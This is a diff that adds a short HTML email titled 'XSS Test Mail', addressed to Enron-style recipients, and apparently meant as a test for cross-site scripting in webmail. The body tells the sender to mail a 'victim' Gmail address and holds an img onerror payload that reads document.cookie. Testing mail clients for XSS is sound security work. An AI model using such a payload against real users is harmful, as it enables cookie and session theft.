@@ -1,0 +1,7 @@
+From: adschai@optonline.net
+To: james.steffes@enron.com, kathryn.corbally@enron.com, steven.kean@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
